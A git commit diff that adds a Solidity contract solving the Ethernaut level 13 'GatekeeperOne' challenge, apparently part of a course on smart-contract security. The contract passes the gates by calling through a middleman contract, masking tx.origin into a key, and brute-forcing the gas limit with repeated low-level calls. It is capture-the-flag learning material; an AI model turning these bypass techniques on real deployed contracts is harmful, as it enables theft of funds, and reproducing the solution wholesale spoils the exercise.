84e869f9e5d4c7a0c88f461722065ce7a290769d
Vladimir Solo <freeman.wushu@mail.ru>
2025-03-22 23:55:51 +0200

    feat: ethernaut level 13 add solution contract GatekeeperOneMiddleman

--- lesson-17-ethernaut/level_13/GatekeeperOne.sol
+++ lesson-17-ethernaut/level_13/GatekeeperOne.sol
@@ -71,3 +71,30 @@ contract Calculator {
         return bytes8(uint64(val));
     }
 }
+
+// https://docs.eridian.xyz/ethereum-dev/defi-challenges/ethernaut/level-13-gatekeeper-1
+
+contract GatekeeperOneMiddleman {
+    function run(address targetContract) public {
+        // Gate one is passed just by calling the enter function from this contract
+        // causing the tx.origin to be different from the msg.sender
+
+        bool succeeded = false;
+
+        // Gate three requires...
+        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xffffffff0000ffff);
+
+        uint256 gas = 65782;
+
+        // Gate two requires calculating the gas remaining...
+        for (uint256 i = gas - 5052; i < gas + 5052; i++) {
+            (bool success, ) = address(targetContract).call{gas: i}(
+                abi.encodeWithSignature("enter(bytes8)", key)
+            );
+            if (success) {
+                succeeded = success;
+                break;
+            }
+        }
+    }
+}
